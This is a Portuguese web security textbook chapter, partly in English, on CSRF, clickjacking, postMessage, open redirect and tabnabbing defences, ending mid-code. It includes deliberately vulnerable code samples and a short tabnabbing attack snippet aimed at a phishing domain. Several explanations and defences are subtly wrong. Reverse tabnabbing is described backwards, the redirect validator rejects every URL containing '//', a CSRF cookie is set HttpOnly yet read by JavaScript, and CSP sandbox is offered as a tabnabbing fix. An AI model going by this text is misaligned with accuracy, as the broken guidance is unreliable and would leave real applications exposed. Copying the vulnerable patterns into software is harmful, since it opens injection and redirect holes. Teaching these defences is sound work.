---
layout: default
title: "06-csrf-clickjacking"
---

# Capítulo 06 — CSRF, Clickjacking e Ataques Client-Side

## Objetivos de Aprendizado

Ao final deste capítulo, o leitor será capaz de:

- Compreender os mecanismos por trás de ataques CSRF (Cross-Site Request Forgery) e suas variantes modernas
- Implementar proteções contra CSRF em frameworks populares como Django, Express e Angular
- Entender como o clickjacking funciona e configurar defesas adequadas
- Analisar vulnerabilidades relacionadas a PostMessage e iframes sandboxed
- Identificar e prevenir ataques via open redirect, tabnabbing e window.opener
- Avaliar a segurança de armazenamento client-side em localStorage, sessionStorage e IndexedDB
- Configurar CORS corretamente e evitar configurações incorretas
- Validar o Origin header para prevenir ataques de injeção de conteúdo
- Implementar soluções completas de prevenção em JavaScript, Python e Go

---

## 6.1 CSRF: Como Funciona, SameSite Cookies e Synchronizer Token Pattern

### 6.1.1 Fundamentos do CSRF

Cross-Site Request Forgery é um ataque que força um usuário autenticado a executar ações não desejadas em uma aplicação web na qual está logado. O ataque explora a confiança que a aplicação tem no navegador do usuário, enviando requisições indesejadas com credenciais legítimas automaticamente anexadas.

O funcionamento básico do CSRF segue estes passos:

1. O usuário faz login em uma aplicação legítima (ex: banco.example.com)
2. O servidor autentica o usuário e emite um cookie de sessão
3. O usuário visita um site malicioso controlado pelo atacante
4. O código malicioso no site do atacante envia requisições para a aplicação legítima
5. O navegador envia automaticamente o cookie de sessão junto com a requisição
6. A aplicação legítima processa a requisição como se fosse legítima

A origem do problema está na forma como os navegadores tratam cookies: eles são enviados automaticamente para o domínio que os criou, independentemente de onde a requisição foi iniciada. Isso significa que qualquer formulário, link ou requisição JavaScript direcionada para o domínio da aplicação incluirá os cookies de sessão.

### 6.1.2 Vetores de Ataque Comuns

Os vetores mais comuns de CSRF incluem:

**Formulários HTML invisíveis:** O atacante cria um formulário que envia uma requisição POST para a aplicação-alvo. O formulário pode ser estilizado para ser invisível ou conter apenas um botão aparente que dispara o envio automático.

**Links de imagem:** Requisições GET podem ser iniciadas através de tags de imagem, onde o atributo `src` aponta para um endpoint que realiza alguma ação. Embora o navegador bloqueie a exibição da imagem, a requisição já foi enviada.

**Scripts e XMLHttpRequest:** Requisições assíncronas via JavaScript podem ser iniciadas de qualquer origem, embora as políticas de same-origin limitem a leitura da resposta.

**Iframes:** Formulários podem ser embutidos em iframes invisíveis, permitindo que o atacante controle completamente o comportamento do envio.

### 6.1.3 Diferença entre CSRF e XSS

É fundamental distinguir CSRF de XSS (Cross-Site Scripting), pois ambos envolvem ataques entre sites, mas funcionam de maneira diferente:

CSRF ataca ações do usuário, enquanto XSS ataca dados do usuário. No CSRF, o atacante força o navegador a realizar ações indesejadas. No XSS, o atacante injeta e executa scripts maliciosos no contexto do navegador da vítima.

No CSRF, o servidor é a vítima direta, pois processa ação não autorizada. No XSS, o usuário é a vítima direta, tendo seus dados roubados ou sua sessão comprometida.

CSRF não requer injeção de código no servidor. XSS requer que o servidor seja vulnerável a injeção de scripts. CSRF pode ser completamente prevenido com tokens de proteção. XSS requer sanitização de entrada e escape de saída.

### 6.1.4 SameSite Cookies

O atributo `SameSite` é um mecanismo de segurança implementado nos navegadores modernos que controla como os cookies são enviados em requisições cross-site. Existem três valores possíveis:

**Strict:** O cookie não é enviado em requisições cross-site, mesmo quando o usuário segue um link do site externo. Esta é a proteção mais forte, mas pode causar problemas em fluxos de autenticação que iniciam em sites externos.

**Lax:** O cookie não é enviado em requisições cross-site que não são navegações de nível superior (como formulários POST via iframes ou XMLHttpRequest). Este é o valor padrão na maioria dos navegadores modernos e oferece um bom equilíbrio entre segurança e usabilidade.

**None:** O cookie é enviado em todas as requisições, incluindo cross-site. Este valor requer que o cookie também tenha o atributo `Secure`, caso contrário os navegadores modernos ignoram o atributo SameSite.

A implementação correta do SameSite envolve configurar os cookies de sessão com o valor apropriado para cada caso de uso:

Para aplicações que não necessitam de autenticação cross-site, o valor `Strict` oferece a máxima proteção. Para aplicações que precisam de algum nível de compatibilidade com fluxos cross-site, o valor `Lax` é recomendado. O valor `None` deve ser usado apenas quando é estritamente necessário enviar cookies em requisições cross-site, como em APIs que são consumidas por múltiplos domínios.

É importante notar que o atributo SameSite não substitui outras proteções CSRF. Ele é uma camada adicional de defesa que funciona em conjunto com tokens de proteção.

### 6.1.5 Synchronizer Token Pattern

O Synchronizer Token Pattern é a defesa mais tradicional e eficaz contra CSRF. O princípio é simples: o servidor gera um token secreto único para cada sessão ou requisição e o inclui em todos os formulários. Quando o formulário é enviado, o servidor verifica se o token presente na requisição corresponde ao token esperado.

O fluxo típico inclui:

1. O servidor gera um token CSRF único e o armazena na sessão do usuário
2. O token é inserido em um campo oculto em todos os formulários da aplicação
3. Quando o formulário é enviado, o servidor compara o token recebido com o armazenado
4. Se os tokens corresponderem, a requisição é processada; caso contrário, ela é rejeitada

A segurança deste padrão baseia-se no fato de que um site malicioso não pode ler o conteúdo de outro site (devido à política same-origin) e, portanto, não pode obter o token CSRF para incluí-lo na requisição maliciosa.

Variantes deste padrão incluem:

**Token por requisição:** Um novo token é gerado para cada requisição individual, oferecendo maior segurança ao limitar a janela de exploração.

**Token criptográfico:** O token é um dado criptografado que contém informações sobre a sessão e o tempo de expiração, permitindo validação stateless no servidor.

**Double Submit Cookie:** O token é enviado tanto no cookie quanto em um cabeçalho ou campo de formulário. O servidor compara os dois valores. Este método não requer armazenamento server-side.

### 6.1.6 Limitações do SameSite

Embora o SameSite seja uma defesa importante, ele possui limitações significativas:

**Compatibilidade com navegadores mais antigos:** Navegadores mais antigos podem não suportar o atributo SameSite ou ignorá-lo completamente.

**Ataques de subdomínio:** Se um atacante comprometer um subdomínio da aplicação, ele pode usar o cookie SameSite como se fosse first-party.

**Navegação de nível superior:** Mesmo com SameSite=Strict, o cookie pode ser enviado em navegações de nível superior, dependendo da implementação do navegador.

**Fluxos de autenticação:** Alguns fluxos de OAuth e SSO dependem de cookies cross-site, e o SameSite pode quebrar esses fluxos se configurado incorretamente.

Por essas razões, o SameSite deve ser usado como uma camada adicional de defesa, não como a única proteção contra CSRF. A combinação de SameSite com synchronizer token pattern oferece a melhor proteção.

---

## 6.2 CSRF em Frameworks: Django CSRF Middleware, Express csurf e Angular

### 6.2.1 Django CSRF Middleware

O Django fornece proteção CSRF integrada através do middleware `django.middleware.csrf.CsrfViewMiddleware`. Esta proteção é ativada por padrão e requer configuração mínima para funcionar corretamente.

O funcionamento do middleware CSRF do Django segue estas etapas:

1. Quando uma requisição GET é feita para uma página com formulário, o middleware gera um token CSRF e o armazena na sessão do usuário
2. O token é disponibilizado para o template através do contexto da requisição
3. O formulário inclui o token como um campo hidden usando a tag de template `csrf_token`
4. Quando o formulário é enviado via POST, o middleware compara o token com o valor armazenado na sessão
5. Se houver correspondência, a requisição é processada; caso contrário, é retornado um erro 403

Para usar a proteção CSRF em templates Django, é necessário incluir a tag `csrf_token` dentro de cada formulário:

{% raw %}
```html
<form method="post" action="/transfer/">
    {% csrf_token %}
    <input type="text" name="amount" />
    <input type="text" name="recipient" />
    <button type="submit">Transfer</button>
</form>
```
{% endraw %}

Para requisições AJAX, o token deve ser enviado como um cabeçalho personalizado. O Django fornece uma função utilitária para obter o token CSRF:

```javascript
function getCookie(name) {
    let cookieValue = null;
    if (document.cookie && document.cookie !== '') {
        const cookies = document.cookie.split(';');
        for (let i = 0; i < cookies.length; i++) {
            const cookie = cookies[i].trim();
            if (cookie.substring(0, name.length + 1) === (name + '=')) {
                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                break;
            }
        }
    }
    return cookieValue;
}

const csrftoken = getCookie('csrftoken');

fetch('/api/transfer/', {
    method: 'POST',
    headers: {
        'X-CSRFToken': csrftoken,
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ amount: 100, recipient: 'user@example.com' })
});
```

Para APIs que usam autenticação token (como JWT), o CSRF não é necessário, pois o token não é enviado automaticamente pelo navegador. Nesses casos, pode-se excluir vistas específicas da proteção CSRF usando o decorador `@csrf_protect` ou `@csrf_exempt`:

```python
from django.views.decorators.csrf import csrf_protect, csrf_exempt

@csrf_protect
def sensitive_action(request):
    # Esta vista requer CSRF token
    pass

@csrf_exempt
def api_endpoint(request):
    # Esta vista não requer CSRF token (apenas para APIs com autenticação token)
    pass
```

Configurações importantes do Django CSRF incluem:

```python
# settings.py

# Chave usada para gerar tokens CSRF
CSRF_COOKIE_SECURE = True  # Envia o cookie apenas via HTTPS
CSRF_COOKIE_HTTPONLY = True  # Impede acesso via JavaScript
CSRF_COOKIE_SAMESITE = 'Lax'  # Configura o atributo SameSite
CSRF_USE_SESSIONS = True  # Armazena o token na sessão em vez de cookie

# Exceções para APIs
CSRF_TRUSTED_ORIGINS = [
    'https://api.example.com',
    'https://app.example.com',
]

# Configurações de CORS (se aplicável)
CSRF_COOKIE_DOMAIN = '.example.com'
```

### 6.2.2 Express csurf

O middleware `csurf` para Express implementa o synchronizer token pattern. Ele gera tokens CSRF e os valida em requisições que modificam dados.

Instalação e configuração básica:

```bash
npm install csurf express-session
```

```javascript
const express = require('express');
const session = require('express-session');
const csrf = require('csurf');

const app = express();

app.use(session({
    secret: 'your-secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: {
        secure: true,
        httpOnly: true,
        sameSite: 'lax'
    }
}));

app.use(csrf({ cookie: true }));

app.get('/form', (req, res) => {
    res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/process', (req, res) => {
    // O middleware valida automaticamente o token CSRF
    res.send('Form processed successfully');
});

// Ignorar CSRF para webhooks ou APIs com autenticação própria
app.post('/api/webhook', (req, res) => {
    // Processar webhook sem validação CSRF
    res.status(200).send('OK');
});
```

Para rotas específicas que não precisam de CSRF, pode-se usar o parâmetro `ignoreMethods` ou criar uma rota separada:

```javascript
// Ignorar CSRF para métodos GET, HEAD e OPTIONS
app.use(csrf({
    cookie: true,
    ignoreMethods: ['GET', 'HEAD', 'OPTIONS']
}));

// Middleware personalizado para ignorar CSRF em rotas específicas
function skipCsrfForApi(req, res, next) {
    if (req.path.startsWith('/api/')) {
        return next();
    }
    return csrf({ cookie: true })(req, res, next);
}

app.use(skipCsrfForApi);
```

Para proteção em aplicações com múltiplas origens, é necessário configurar os cookies corretamente:

```javascript
app.use(session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        sameSite: 'lax',
        domain: '.example.com'
    }
}));
```

### 6.2.3 Angular CSRF Protection

Angular fornece suporte integrado para proteção CSRF através do `HttpClientXsrfModule`. O Angular envia automaticamente um token CSRF em requisições POST, PUT, DELETE e PATCH quando configurado corretamente.

Configuração básica:

```typescript
import { NgModule } from '@angular/core';
import { CommonModule } from '@angular/common';
import { HttpClientXsrfModule, HttpXsrfTokenExtractor } from '@angular/common/http';

@NgModule({
    imports: [
        CommonModule,
        HttpClientXsrfModule.withOptions({
            cookieName: 'XSRF-TOKEN',
            headerName: 'X-XSRF-TOKEN'
        })
    ],
    providers: [
        {
            provide: HttpXsrfTokenExtractor,
            useClass: HttpXsrfTokenExtractor
        }
    ]
})
export class AppModule { }
```

No lado do servidor, o framework deve configurar o cookie `XSRF-TOKEN` que o Angular lê automaticamente:

```typescript
// Node.js/Express exemplo
app.use((req, res, next) => {
    res.cookie('XSRF-TOKEN', generateCsrfToken(), {
        httpOnly: false,  // Angular precisa ler via JavaScript
        secure: true,
        sameSite: 'lax'
    });
    next();
});
```

O Angular também permite customizar o comportamento da proteção CSRF:

```typescript
import { Injectable } from '@angular/core';
import { HttpInterceptor, HttpRequest, HttpHandler, HttpEvent } from '@angular/common/http';
import { Observable } from 'rxjs';

@Injectable()
export class CsrfInterceptor implements HttpInterceptor {
    intercept(req: HttpRequest<any>, next: HttpHandler): Observable<HttpEvent<any>> {
        // Não adicionar token para requisições GET
        if (req.method === 'GET') {
            return next.handle(req);
        }

        // Obter token do cookie
        const csrfToken = this.getCsrfToken();

        if (csrfToken) {
            const cloned = req.clone({
                setHeaders: {
                    'X-CSRFToken': csrfToken
                }
            });
            return next.handle(cloned);
        }

        return next.handle(req);
    }

    private getCsrfToken(): string | null {
        const name = 'csrftoken=';
        const decodedCookie = decodeURIComponent(document.cookie);
        const ca = decodedCookie.split(';');
        for (let i = 0; i < ca.length; i++) {
            const c = ca[i].trim();
            if (c.indexOf(name) === 0) {
                return c.substring(name.length, c.length);
            }
        }
        return null;
    }
}
```

### 6.2.4 Comparação entre Frameworks

Cada framework aborda a proteção CSRF de maneira diferente:

Django usa um middleware global que intercepta todas as requisições e requer que cada formulário inclua explicitamente o token CSRF. Esta abordagem é segura por padrão mas pode ser verbosa.

Express (com csurf) oferece maior flexibilidade, permitindo que o desenvolvedor escolha quais rotas precisam de proteção. No entanto, isso também aumenta o risco de esquecer de aplicar a proteção em rotas vulneráveis.

Angular automatiza a proteção CSRF para requisições HTTP, mas requer configuração adequada no servidor para o cookie XSRF-TOKEN. A abordagem é transparente para o desenvolvedor quando configurada corretamente.

React não possui proteção CSRF integrada, e a implementação depende de bibliotecas externas ou configuração manual. Isso pode ser um risco se o desenvolvedor não estiver ciente da necessidade.

Vue.js também não possui proteção CSRF integrada, e a implementação é similar à do React, dependendo de configuração manual ou bibliotecas externas.

---

## 6.3 Clickjacking: Frame-Busting, X-Frame-Options e CSP frame-ancestors

### 6.3.1 Mecanismo do Clickjacking

Clickjacking (também conhecido como UI Redressing) é uma técnica de ataque onde o usuário é enganado para clicar em algo diferente do que percebe. O atacante camufla um elemento interativo da página-alvo dentro de um iframe transparente, posicionando-o sobre um elemento aparente na página do atacante.

O funcionamento básico envolve:

1. O atacante cria uma página que mostra algo aparentemente inofensivo (ex: um jogo, um botão de "clique para ganhar")
2. A página real do alvo é embutida em um iframe transparente
3. O iframe é posicionado sobre o elemento que o usuário pretende clicar
4. Quando o usuário clica no que parece ser o elemento visível, ele está na verdade interagindo com a página oculta do alvo

Isso pode ser usado para forzar o usuário a:
- Clicar em botões de confirmação em transações financeiras
- Aceitar termos de serviço indesejados
- Seguir contas em redes sociais
- Autorizar aplicativos em contas vinculadas

### 6.3.2 Frame-Busting

Frame-busting é uma técnica antiga que tenta prevenir clickjacking usando JavaScript para quebrar frames. O conceito é incluir um script na página que verifica se a página está sendo exibida em um iframe e, se estiver, força o navegador a carregar a página no nível superior.

Implementação típica de frame-busting:

```javascript
(function() {
    if (self === top) {
        // A página não está em um iframe
        document.documentElement.style.display = 'block';
    } else {
        // A página está em um iframe, tentar quebrar
        try {
            top.location = self.location;
        } catch (e) {
            // Se não for possível acessar top.location, bloquear o carregamento
            document.documentElement.style.display = 'none';
            document.body.innerHTML = '';
        }
    }
})();
```

Limitações do frame-busting:

O frame-busting pode ser facilmente contornado usando sandboxed iframes, onde o atributo `sandbox` impede a navegação do frame pai. Um atacante pode usar `sandbox="allow-scripts"` para executar o JavaScript da vítima enquanto impede que ele quebre o iframe.

O frame-busting também pode ser contornado usando `Content-Security-Policy` no frame pai para bloquear a execução de scripts na página embutida. Além disso, técnicas como `postMessage` podem ser usadas para se comunicar com o iframe e contornar as verificações.

### 6.3.3 X-Frame-Options

O cabeçalho HTTP `X-Frame-Options` (XFO) foi introduzido para permitir que os servidores declarassem se suas páginas podiam ser exibidas em frames. Existem três valores possíveis:

**DENY:** A página não pode ser exibida em nenhum frame, independentemente do site que está tentando exibi-la. Esta é a opção mais restritiva e segura para páginas que nunca precisam ser frameadas.

**SAMEORIGIN:** A página pode ser exibida em frames apenas do mesmo domínio. Isso permite que a própria aplicação use frames internamente, mas bloqueia frames de domínios externos.

**ALLOW-FROM uri:** A página pode ser exibida em frames apenas do domínio especificado. Esta opção foi descontinuada e não é suportada por todos os navegadores modernos.

Configuração em diferentes servidores:

**Apache:**
```apache
Header always set X-Frame-Options "DENY"
Header always set X-Frame-Options "SAMEORIGIN"
```

**Nginx:**
```nginx
add_header X-Frame-Options "DENY" always;
add_header X-Frame-Options "SAMEORIGIN" always;
```

**Django:**
```python
# settings.py
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_BROWSER_XSS_FILTER = True
X_FRAME_OPTIONS = 'DENY'

# Ou por view
from django.views.decorators.clickjacking import xframe_options_deny
from django.views.decorators.clickjacking import xframe_options_sameorigin

@xframe_options_deny
def my_view(request):
    pass

@xframe_options_sameorigin
def my_view_with_frames(request):
    pass
```

**Express:**
```javascript
const helmet = require('helmet');
app.use(helmet.frameguard({ action: 'deny' }));
app.use(helmet.frameguard({ action: 'sameorigin' }));
```

Limitações do X-Frame-Options:

O XFO não suporta múltiplos valores, o que pode ser problemático quando uma página precisa ser frameada por múltiplos domínios legítimos. O valor `ALLOW-FROM` foi descontinuado e não é suportado por todos os navegadores. O XFO também não oferece granularidade por tipo de conteúdo.

### 6.3.4 CSP frame-ancestors

Content Security Policy (CSP) com a diretiva `frame-ancestors` é a abordagem moderna e recomendada para prevenir clickjacking. Ela substitui o X-Frame-Options com maior flexibilidade e suporte a múltiplos valores.

A diretiva `frame-ancestors` define quais origens podem incorporar a página em um frame ou iframe. Diferente do X-Frame-Options, ela suporta múltiplas origens e é mais compatível com cenários complexos.

Configuração da CSP frame-ancestors:

**Apache:**
```apache
Header always set Content-Security-Policy "frame-ancestors 'none'"
Header always set Content-Security-Policy "frame-ancestors 'self'"
Header always set Content-Security-Policy "frame-ancestors 'self' https://trusted.example.com"
```

**Nginx:**
```nginx
add_header Content-Security-Policy "frame-ancestors 'none'" always;
add_header Content-Security-Policy "frame-ancestors 'self'" always;
add_header Content-Security-Policy "frame-ancestors 'self' https://trusted.example.com" always;
```

**Django:**
```python
# settings.py
CSP_FRAME_ANCESTORS = ["'none'"]
CSP_FRAME_ANCESTORS = ["'self'"]
CSP_FRAME_ANCESTORS = ["'self'", "https://trusted.example.com"]
```

**Node.js/Express:**
```javascript
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
    directives: {
        frameAncestors: ["'none'"]
    }
}));
```

Comparação entre X-Frame-Options e CSP frame-ancestors:

| Característica | X-Frame-Options | CSP frame-ancestors |
|----------------|-----------------|---------------------|
| Múltiplos valores | Não | Sim |
| Suporte a wildcards | Não | Sim |
| Subdomínios | Não | Sim (com wildcards) |
| Compatibilidade | Amplamente suportado | Suportado em navegadores modernos |
| Granularidade | Baixa | Alta |

Recomendação: Use `frame-ancestors` como defesa primária e mantenha `X-Frame-Options` como fallback para navegadores mais antigos. Ambos os cabeçalhos podem coexistir sem conflitos.

### 6.3.5 Detectando Clickjacking

Existem várias técnicas para detectar tentativas de clickjacking:

**Verificação de frames via JavaScript:**
```javascript
// Verificar se a página está em um iframe
if (window.self !== window.top) {
    // A página está em um iframe - possível clickjacking
    document.body.innerHTML = '';
    window.top.location = window.self.location;
}

// Usando MutationObserver para detectar mudanças
const observer = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
        if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
            // Detectar mudanças de estilo que podem indicar camuflagem
            const element = mutation.target;
            if (element.style.opacity === '0' || element.style.visibility === 'hidden') {
                // Possível tentativa de esconder elementos
                console.warn('Possible clickjacking attempt detected');
            }
        }
    });
});

observer.observe(document.body, {
    attributes: true,
    attributeFilter: ['style', 'class']
});
```

**Verificação de z-index e posição:**
```javascript
function detectClickjacking() {
    const elements = document.querySelectorAll('*');
    for (const element of elements) {
        const style = window.getComputedStyle(element);
        const rect = element.getBoundingClientRect();

        // Verificar se há elementos com z-index muito alto
        if (parseInt(style.zIndex) > 1000) {
            console.warn('Element with high z-index detected:', element);
        }

        // Verificar se há elementos posicionados fora da tela
        if (rect.top < -100 || rect.left < -100) {
            console.warn('Element positioned off-screen:', element);
        }
    }
}

// Executar periodicamente
setInterval(detectClickjacking, 5000);
```

---

## 6.4 PostMessage Attacks e Sandboxed Iframes

### 6.4.1 Mecanismo do PostMessage

`window.postMessage()` é uma API do navegador que permite a comunicação entre janelas e iframes de origens diferentes. Ela é essencial para aplicações que precisam de comunicação cross-origin, mas pode ser explorada se implementada incorretamente.

O fluxo básico do PostMessage inclui:

1. A janela remetente chama `targetWindow.postMessage(message, targetOrigin)`
2. A janela de destino recebe um evento `message`
3. O desenvolvedor implementa um `messageEvent` listener para processar a mensagem

Exemplo de uso legítimo:

```javascript
// Página pai (origin: https://app.example.com)
const iframe = document.getElementById('child-frame');
iframe.contentWindow.postMessage({ type: 'getData', id: 123 }, 'https://widget.example.com');

// Widget (origin: https://widget.example.com)
window.addEventListener('message', (event) => {
    // Verificar a origem do remetente
    if (event.origin !== 'https://app.example.com') {
        return;
    }

    if (event.data.type === 'getData') {
        const response = { type: 'dataResponse', data: { name: 'John', id: event.data.id } };
        event.source.postMessage(response, event.origin);
    }
});
```

### 6.4.2 Vulnerabilidades Comuns do PostMessage

As vulnerabilidades mais comuns no uso do PostMessage incluem:

**Ausência de verificação de origem:** Não verificar `event.origin` permite que qualquer página envie mensagens maliciosas para o listener.

```javascript
// VULNERAVEL - Não verifica a origem
window.addEventListener('message', (event) => {
    // Qualquer página pode enviar esta mensagem
    executeCommand(event.data);
});

// SEGURO - Verifica a origem
window.addEventListener('message', (event) => {
    if (event.origin !== 'https://trusted.example.com') {
        return;
    }
    executeCommand(event.data);
});
```

**Uso de origem curinga:** Usar `*` como `targetOrigin` permite que a mensagem seja enviada para qualquer janela.

```javascript
// VULNERAVEL - Envia para qualquer origem
iframe.contentWindow.postMessage(data, '*');

// SEGURO - Envia apenas para origem específica
iframe.contentWindow.postMessage(data, 'https://trusted.example.com');
```

**Processamento de dados não validados:** Aceitar e processar dados do PostMessage sem validação pode levar a injeção de código.

```javascript
// VULNERAVEL - Injeta HTML diretamente
window.addEventListener('message', (event) => {
    document.getElementById('content').innerHTML = event.data.html;
});

// SEGURO - Valida e sanitiza os dados
window.addEventListener('message', (event) => {
    if (event.origin !== 'https://trusted.example.com') {
        return;
    }

    const sanitized = sanitizeHtml(event.data.html);
    document.getElementById('content').innerHTML = sanitized;
});
```

### 6.4.3 Sandboxed Iframes

Iframes sandboxed usam o atributo `sandbox` do HTML5 para restringir as capacidades do iframe. Isso é útil para isolar conteúdo de terceiros e reduzir a superfície de ataque.

Valores do atributo sandbox:

**allow-scripts:** Permite a execução de scripts dentro do iframe. Sem isso, nenhum JavaScript será executado.

**allow-same-origin:** Permite que o iframe seja tratado como same-origin. Sem isso, o conteúdo é tratado como uma origem única opaca.

**allow-forms:** Permite que o iframe submeta formulários. Sem isso, formulários não podem ser enviados.

**allow-popups:** Permite que o iframe abra popups. Sem isso, `window.open` e alvos `_blank` são bloqueados.

**allow-top-navigation:** Permite que o iframe navegue o frame pai. Sem isso, tentativas de navegação são bloqueadas.

Exemplo de iframe sandboxed seguro:

```html
<!-- Isolamento total - apenas renderização -->
<iframe src="https://untrusted.example.com" 
        sandbox="allow-scripts allow-same-origin"
        style="display: none;"></iframe>

<!-- Permitir apenas formulários -->
<iframe src="https://form-provider.example.com" 
        sandbox="allow-forms"
        style="display: block; width: 100%; height: 200px;"></iframe>

<!-- Sem permissões - apenas conteúdo estático -->
<iframe src="https://content-provider.example.com" 
        sandbox=""
        style="display: block; width: 100%; height: 300px;"></iframe>
```

### 6.4.4 Combinando PostMessage com Sandbox

Quando se combina PostMessage com iframes sandboxed, é necessário considerar as implicações de segurança:

```javascript
// Página pai
const iframe = document.createElement('iframe');
iframe.src = 'https://widget.example.com';
iframe.sandbox = 'allow-scripts';  // Não allow-same-origin
document.body.appendChild(iframe);

// Após o iframe carregar
iframe.onload = () => {
    iframe.contentWindow.postMessage({ type: 'init' }, 'https://widget.example.com');
};

// Listener no pai
window.addEventListener('message', (event) => {
    if (event.origin !== 'https://widget.example.com') {
        return;
    }

    if (event.data.type === 'userAction') {
        // Processar ação do widget
        handleWidgetAction(event.data);
    }
});
```

### 6.4.5 Padrões Seguros de PostMessage

Para garantir a segurança ao usar PostMessage, siga estes padrões:

**Use um canal seguro:**
```javascript
// Criar um canal seguro com verificações
const channel = new MessageChannel();

// Port1 para o remetente, Port2 para o destinatário
iframe.contentWindow.postMessage({ type: 'handshake' }, 'https://trusted.example.com', [channel.port2]);
```

**Implemente um protocolo de autenticação:**
```javascript
// Protocolo de handshake
window.addEventListener('message', (event) => {
    if (event.origin !== 'https://trusted.example.com') {
        return;
    }

    if (event.data.type === 'auth-request') {
        // Verificar credenciais
        if (validateCredentials(event.data.credentials)) {
            event.source.postMessage({
                type: 'auth-success',
                token: generateToken()
            }, event.origin);
        } else {
            event.source.postMessage({
                type: 'auth-failure'
            }, event.origin);
        }
    }
});
```

**Use schema de mensagens definido:**
```javascript
// Definir schema das mensagens
const MessageSchema = {
    'getData': { required: ['id'], optional: ['filter'] },
    'setData': { required: ['id', 'data'], optional: [] },
    'deleteData': { required: ['id'], optional: [] }
};

function validateMessage(message) {
    const schema = MessageSchema[message.type];
    if (!schema) return false;

    for (const field of schema.required) {
        if (!(field in message)) return false;
    }

    return true;
}
```

---

## 6.5 Open Redirect Attacks

### 6.5.1 Mecanismo do Open Redirect

Open redirect occurs when an application redirects a user to an attacker-controlled URL. This can be exploited in phishing attacks, OAuth token theft, and other scenarios where the redirect URL is trusted.

The vulnerability typically occurs when:

1. A parameter controls the redirect destination
2. The application validates the parameter insufficiently
3. The redirect happens automatically without user confirmation

Common vulnerable patterns:

```javascript
// VULNERABLE - No validation
app.get('/redirect', (req, res) => {
    const url = req.query.url;
    res.redirect(url);
});

// VULNERABLE - Insufficient validation
app.get('/redirect', (req, res) => {
    const url = req.query.url;
    if (url.startsWith('/')) {
        res.redirect(url);
    }
});
```

### 6.5.2 Attack Vectors

**Phishing:** The attacker sends a link to a legitimate domain that redirects to a phishing site. The user sees the legitimate domain in the URL and trusts the link.

**OAuth Token Theft:** In OAuth flows, if the redirect URI is not properly validated, the attacker can steal authorization codes or tokens.

**Session Fixation:** By controlling the redirect, the attacker can set cookies or session parameters before redirecting to the legitimate site.

### 6.5.3 Prevention Techniques

**Whitelist validation:**
```javascript
const ALLOWED_REDIRECTS = [
    '/dashboard',
    '/profile',
    '/settings',
    'https://app.example.com'
];

function isRedirectAllowed(url) {
    try {
        const parsed = new URL(url, window.location.origin);

        // Check if it's a relative path
        if (parsed.origin === window.location.origin) {
            return ALLOWED_REDIRECTS.includes(parsed.pathname);
        }

        // Check if it's an allowed external URL
        return ALLOWED_REDIRECTS.includes(parsed.origin);
    } catch {
        return false;
    }
}

app.get('/redirect', (req, res) => {
    const url = req.query.url;
    if (isRedirectAllowed(url)) {
        res.redirect(url);
    } else {
        res.status(400).send('Invalid redirect URL');
    }
});
```

**Use a redirect ID instead of URL:**
```javascript
const REDIRECT_MAP = {
    'dashboard': '/dashboard',
    'profile': '/profile',
    'settings': '/settings'
};

app.get('/redirect/:id', (req, res) => {
    const destination = REDIRECT_MAP[req.params.id];
    if (destination) {
        res.redirect(destination);
    } else {
        res.status(404).send('Redirect not found');
    }
});
```

**Validate protocol and domain:**
```javascript
function validateRedirectUrl(url) {
    try {
        const parsed = new URL(url);

        // Only allow HTTPS
        if (parsed.protocol !== 'https:') {
            return false;
        }

        // Only allow specific domains
        const allowedDomains = ['example.com', 'app.example.com'];
        if (!allowedDomains.includes(parsed.hostname)) {
            return false;
        }

        // Block suspicious patterns
        if (url.includes('@') || url.includes('\\') || url.includes('//')) {
            return false;
        }

        return true;
    } catch {
        return false;
    }
}
```

---

## 6.6 Tabnabbing (Reverse Tabnabbing)

### 6.6.1 Mecanismo do Tabnabbing

Tabnabbing (ou reverse tabnabbing) é um ataque que explora o comportamento de links com `target="_blank"`. Quando um link abre em uma nova aba, a página original pode acessar e manipular a nova aba através da referência `window.opener`.

O ataque funciona da seguinte forma:

1. O atacante cria uma página que contém links para sites legítimos com `target="_blank"`
2. O usuário clica em um desses links, abrindo o site legítimo em uma nova aba
3. A aba original (controlada pelo atacante) usa `window.opener.location` para redirecionar a nova aba para um site de phishing
4. O usuário, ao voltar para a aba original, vê o site de phishing em vez do site legítimo

Exemplo de código malicioso:

```html
<!-- Página do atacante -->
<a href="https://legitimate-bank.com" target="_blank">Click here for banking</a>

<script>
    // Após o link ser aberto em nova aba
    window.opener.location = 'https://phishing-bank.com';
</script>
```

### 6.6.2 Prevenção do Tabnabbing

**Usar rel="noopener noreferrer":**
```html
<!-- O atributo rel impede que window.opener acesse a janela original -->
<a href="https://legitimate-bank.com" target="_blank" rel="noopener noreferrer">
    Click here for banking
</a>
```

**Adicionar automaticamente via JavaScript:**
```javascript
// Encontrar todos os links com target="_blank" e adicionar rel="noopener noreferrer"
document.addEventListener('DOMContentLoaded', () => {
    const links = document.querySelectorAll('a[target="_blank"]');
    links.forEach(link => {
        const rel = link.getAttribute('rel') || '';
        if (!rel.includes('noopener')) {
            link.setAttribute('rel', `${rel} noopener noreferrer`.trim());
        }
    });
});
```

**Configuração no servidor:**
```javascript
// Middleware para adicionar rel="noopener" em todos os links externos
function addNoopener(req, res, next) {
    const originalSend = res.send;
    res.send = function(body) {
        if (typeof body === 'string') {
            body = body.replace(
                /target="_blank"/g,
                'target="_blank" rel="noopener noreferrer"'
            );
        }
        return originalSend.call(this, body);
    };
    next();
}

app.use(addNoopener);
```

**Content Security Policy:**
```
Content-Security-Policy: sandbox allow-scripts allow-same-origin; upgrade-insecure-requests
```

### 6.6.3 Detecção e Monitoramento

Para detectar tentativas de tabnabbing:

```javascript
// Monitorar tentativas de acesso via window.opener
if (window.opener) {
    // Tentar bloquear acesso
    try {
        window.opener = null;
        // Em navegadores mais antigos
        Object.defineProperty(window, 'opener', {
            get: () => null,
            set: () => {}
        });
    } catch (e) {
        // Registrar tentativa
        console.warn('Possible tabnabbing attempt detected');
    }
}

// Monitorar mudanças de location
window.addEventListener('beforeunload', (event) => {
